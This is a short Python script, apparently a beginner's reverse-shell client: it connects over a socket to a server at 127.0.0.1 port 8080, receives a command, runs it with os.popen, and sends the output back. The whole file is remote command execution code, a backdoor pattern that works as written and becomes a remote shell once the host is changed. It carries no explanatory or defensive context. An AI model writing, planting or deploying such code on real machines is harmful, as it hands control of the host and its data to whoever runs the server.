import time
import socket
import sys
import os
s = socket.socket()
host = "127.0.0.1"
port = 8080
s.connect((host,port))
print("Connected to server")
command = s.recv(1024)
command = command .decode()
if command:
    print("Command is : ",command)
    # os.system(command)
    result = os.popen(command).read()
    s.send(result.encode())

